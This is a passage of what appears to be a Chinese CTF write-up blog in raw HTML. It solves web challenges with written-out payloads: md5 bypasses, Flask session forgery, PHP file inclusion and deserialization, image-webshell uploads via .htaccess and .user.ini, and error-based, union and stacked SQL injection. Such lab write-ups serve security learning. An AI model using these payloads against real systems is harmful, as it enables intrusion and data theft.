class="hljs-number">276</span>f<span class="hljs-number">722736</span><span class="hljs-keyword">c</span><span class="hljs-number">95</span>d<span class="hljs-number">99e921722</span>cf<span class="hljs-number">9</span>ed<span class="hljs-number">621</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol">raw:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>\xc<span class="hljs-number">9</span>]\<span class="hljs-keyword">x</span><span class="hljs-number">99</span>\xe<span class="hljs-number">9</span><span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>\xf<span class="hljs-number">9</span>\xedb\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol">string:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>]<span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>b<br></code></pre></td></tr></table></figure><p> 这里需要注意的是，当raw项为<strong>true</strong>时，返回的这个原始二进制不是普通的二进制（0，1），而是 <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code> 这种。</p><p><code>ffifdyop</code> 这个字符串就可以进行绕过。</p><p><img src="https://s2.loli.net/2022/12/29/Tmcs85LiMu3ep7S.png" alt="image-20221229223802809"></p><p> 我们访问 <code>/levels91.php</code> 查看源码：</p><img src="https://s2.loli.net/2022/12/29/x8Sl4bnRczTYowF.png" alt="image-20221229223829462" style="zoom:33%;" /><p>php md5() 函数绕过，我们可以传入两个数组，md5()处理不了数组会返回NULL,于是 NULL&#x3D;&#x3D;NULL 实现绕过。</p><img src="https://s2.loli.net/2022/12/29/Fj2L9wBM4WtYZ8Q.png" alt="image-20221229224020132" style="zoom:33%;" /><p>和上面一样的方法：</p><img src="https://s2.loli.net/2022/12/29/GkIBDlsLmQAj46x.png" alt="image-20221229224209698" style="zoom:33%;" /><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>我们注册登录账号之后，在change页源代码中发现了提示：</p><img src="https://s2.loli.net/2022/12/29/GXjZVfJaQySo6UH.png" alt="image-20221229224947629" style="zoom:33%;" /><p>下载后打开，发现这是一个flask框架。由于题目说admin才能有用，于是我们在文件中找到了admin账号、密码。</p><p><img src="https://s2.loli.net/2022/12/29/JRhOCK35z6oW2rb.png" alt="image-20221229225056550"></p><p>我们对网页进行抓包，发现session：</p><p><img src="https://s2.loli.net/2022/12/29/YgTwESGFrRauJ91.png" alt="image-20221229225335140"></p><p>发现有个 <code>flask session</code> 加密，但是 session 可以伪造</p><p>我们可以使用脚本，但是想要伪造的话，需要一个key，我们在 config.py 中找到了：</p><p><img src="https://s2.loli.net/2022/12/29/2SznspK9wXWeyd1.png" alt="image-20221229230329840"></p><p><img src="https://s2.loli.net/2022/12/29/u7rIC9dqiL8PER6.png" alt="image-20221229230532185"></p><p>如图，解密出来了，我们只需要把用户名换成 admin 在编码为 session即可：</p><p><img src="https://s2.loli.net/2022/12/29/AiLWGUtoIRyKY6m.png" alt="image-20221229230730894"></p><p>然后首页把session替换一下即可：</p><img src="https://s2.loli.net/2022/12/29/cKpwhOiQ2ANoWgZ.png" alt="image-20221229230858737" style="zoom: 25%;" /><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password </span>= <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>代码审计一下，此处考点是文件包含漏洞</p><p>text 参数可以使用 <code>php://input 伪协议</code>，或者使用 <code>data 伪协议</code> </p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain,welcome+to+the+zjctf</span><br></code></pre></td></tr></table></figure><p>file参数提示要包含 useless.php ,于是我们可以先使用 <code>php://filter 伪协议</code>读取源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=useless.php</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>读取到了useless.php 源码，发现有一个 __tostring() 方法，我们在输出对象时会调用该方法，</p><p>我们再分析一下 index.php ,发现我们传的参数 password需要序列化。</p><p>因此，我们需要创建一个 Flag 对象， $file&#x3D;flag.php 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">password=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/MeDOA9HPYbcN2p4.png" alt="image-20221230143321116"></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>我们首先上传一张图片马：</p><p><img src="https://s2.loli.net/2022/12/30/boaU2ETRF9NDCJO.png" alt="image-20221230144325738"></p><p>然后我们上传 <code>.htaccess</code> 文件 ，目的是将 png 文件以 php脚本进行解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .png<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/xdHloT8JwQgt5vc.png" alt="image-20221230144419917"></p><p>然后使用蚁剑连接即可：</p><img src="https://s2.loli.net/2022/12/30/AiWKw4lk6ecGCnJ.png" alt="image-20221230144456788" style="zoom:33%;" /><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>我们从密码处测试，发现很多被过滤了(可以使用fuzz)，union，if被过滤了，所以不能使用联合查询，bool盲注等方法了。并且空格过滤了，<code>/**/</code> <code>%0a</code> 等方法都不行，我们只用一种方法了，使用 () 去分隔：</p><blockquote><p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格</p></blockquote><p><img src="https://s2.loli.net/2022/12/30/ekrJKxvMn815aD2.png" alt="image-20221230153809484"></p><p>我们使用 <code>&#39;or(1)%23</code> 登录成功，但是没有回显。我们错误信息会显示出来，因此我们可以使用<code>报错注入</code></p><p>此处使用 <code>updatexml()</code></p><p>查询表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;or(updatexml(0,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#x27;geek&#x27;)),0x7e),0))%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/n7jrbLicqtuXp21.png" alt="image-20221230154018217"></p><p>查询字段名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;or(updatexml(0,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#x27;H4rDsq1&#x27;)),0x7e),0))%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/B7nNh64WR3gLx82.png" alt="image-20221230154042308"></p><p>查询 password字段数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;or(updatexml(0,concat(0x7e,(select(group_concat(password))from`H4rDsq1`),0x7e),0))%23<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/Plv3YZEXkSrp6s2.png" alt="image-20221230154135080"></p><p>此时我们发现只显示出来一部分，我们尝试使用 substr()、mid()等函数，发现被过滤了。</p><p>但是我们还可以使用 left()、right()函数，这里只能使用right()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;or(updatexml(0,concat(0x7e,(select(right(group_concat(password),30))from`H4rDsq1`),0x7e),0))%23<br># 显示右边的30个字符<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/MrDc3vbUQWYt7sk.png" alt="image-20221230154323397"></p><p>得到flag</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><img src="https://s2.loli.net/2022/12/30/kzslJH2Qdgm1y8n.png" alt="image-20221230154931832"></p><p>md5()函数传数组返回空NULL，实现绕过。</p><p>passwd&#x3D;1234567a（php弱类型比较）</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>文件上传题，首先我们先上传一张内容为:aaa的图片：</p><img src="https://s2.loli.net/2022/12/30/FieMZNhKRX1Wf6Q.png" alt="image-20221230155524919" style="zoom:33%;" /><p>发现它检查了文件的内容，于是我们加上GIF图片的头，发现上传成功：</p><img src="https://s2.loli.net/2022/12/30/wdh1K6izqV9SoD8.png" alt="image-20221230165244613" style="zoom:33%;" /><p>发现上传图片马没有用，说包含了 <code>&lt;?</code> ，于是我们可以采用另一种形式：&lt; script&gt;</p><p><img src="https://s2.loli.net/2022/12/30/fPuGi1eT2JLanto.png" alt="image-20221230165347545"></p><p>我们发现，同级目录下存在 index.php ,于是，我们可以上传 <code>.user.ini</code> 文件，</p><p>这样的话会把我们指定的后缀包含进同级目录下的 php 文件中：</p><img src="https://s2.loli.net/2022/12/30/FsG35yDHl4E6VWn.png" alt="image-20221230165743029" style="zoom:33%;" /><p>然后使用蚁剑连接一下即可。</p><h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op </span>= <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename </span>= <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content </span>= <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> function process</span>() &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span><span class="hljs-title function_ invoke__"> if</span>(<span class="hljs-variable">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res </span>= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span><span class="hljs-title function_ invoke__"> function write</span>() &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res </span>= <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span><span class="hljs-title function_ invoke__"> function read</span>() &#123;<br>        <span class="hljs-variable">$res </span>= <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res </span>= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span><span class="hljs-title function_ invoke__"> function output</span>(<span class="hljs-variable">$s</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i </span>= <span class="hljs-number">0</span>; <span class="hljs-variable">$i </span>&lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str </span>= (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj </span>= <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析代码，我们可以使用 php弱类型比较绕过 __destruct() 方法将 op-&gt;1.</p><p>并且只要 $filename&#x3D;”flag.php” 就可以读取到 源码，得到 flag了。</p><p>但是此处有一个问题，将 protected修饰的变量序列化之后，会产生不可见字符<code>\00*\00</code>，这样我们无法绕过 is_valid()检查</p><p>我们可以将其先改为public修饰，这样就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>());<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>传参给str，成功得到flag：</p><p><img src="https://s2.loli.net/2022/12/30/YftDcvqCkwFlURn.png" alt="image-20221230171130134"></p><blockquote><p><strong>对于PHP版本7.1+，对属性的类型不敏感</strong>，我们可以将protected类型改为public，以消除不可打印字符</p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><img src="https://s2.loli.net/2022/12/30/REN5BpwxJWoIYT3.png" alt="image-20221230175705992" style="zoom:33%;" /><p>登录的时候抓包：</p><p><img src="https://s2.loli.net/2022/12/30/61spyjToenhvkUB.png" alt="image-20221230175229141"></p><p>发现源码中有一串编码(字母大写+数字) 这是 base32编码</p><p>于是我们去解密，得到 base64编码，再解密得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from user where username = &#x27;$name&#x27;<br></code></pre></td></tr></table></figure><p>我们尝试使用 ‘  闭合： 使用 Or (or被过滤了)</p><p><img src="https://s2.loli.net/2022/12/30/f1dPV8tFiayL43O.png" alt="image-20221230175633108"></p><p>我们发现密码错误，然后我们使用 <code>Order by</code> 判断出字段数为 3</p><p>我们发现 () 被过滤了，玩毛。</p><p>然后，这题的逻辑是这样的：</p><blockquote><p>首先将 输入的username进行数据库查询，如果username为 admin，查询出密码，并且将密码pw与其比较，相等则查询成功。（一般查询出的密码会被加密）</p></blockquote><p>我们需要知道一个知识点： </p><p><strong>union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中</strong></p><p>由于查询到字段数为3，我们猜测表的结构 : id,username,password ，password的加密方式为md5</p><p>于是我们可以构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs MYSQL">&#x27; union select 1,&#x27;admin&#x27;,&#x27;698d51a19d8a121ce581499d7b701668&#x27; #                     111的md5值<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/8RAsUQdlOjMrae3.png" alt="image-20221230180458933"></p><p>由于前面一条查询 username&#x3D;’’ 查询不到数据，但是我们的联合查询构造了一个虚拟数据并且返回。</p><p>经过判断，username&#x3D;admin，password &#x3D;md5(pw)</p><p>那么登录正确，拿到flag</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>我们上传一张png图片马：</p><img src="https://s2.loli.net/2022/12/30/HAslzhYFNVT4G8m.png" alt="image-20221230180850931" style="zoom:33%;" /><p>发现不行，可能对文件内容进行了检测，我们添加GIF文件头 <code>GIF89a</code></p><p><img src="https://s2.loli.net/2022/12/30/azZckWuMwrh8LqS.png" alt="image-20221230180945076"></p><p>还是不行，可能过滤了php关键字，我们把php换成 &#x3D; </p><img src="https://s2.loli.net/2022/12/30/p3sb9r8lGRh1uM4.png" alt="image-20221230181031360" style="zoom:33%;" /><p>还是不行，我们换一种php脚本写法：</p><p><img src="https://s2.loli.net/2022/12/30/JlDjbadwxnQAePU.png" alt="image-20221230181122528"></p><p>额，还是不行，可能是不能上传png图片，我们把文件类型换成jpg试一下：</p><img src="https://s2.loli.net/2022/12/30/mTQJN1DIV268Rns.png" alt="image-20221230181202394" style="zoom:33%;" /><p>成功了。</p><p>然后我们上传 <code>.htaccess</code>  （apache服务器）把png解析为php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .png<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/30/qko4R1Gm23zpagM.png" alt="image-20221230181529103"></p><p>然后我们访问 a.png,发现已经成功解析了，只要使用蚁剑连接即可。</p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>很多都过滤了，select也过滤掉了。只能使用堆叠注入了。</p><p>查数据库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">?inject=&#x27;;show+databases;%23<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/30/OtwEg3l9mebfHjn.png" alt="image-20221230190147354" style="zoom: 25%;" /><p>查询表名：</p><img src="https://s2.loli.net/2022/12/30/46KF1tCXSfJlydr.png" alt="image-20221230190234896" style="zoom:33%;" /><p>查询表 FlagHere 的列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 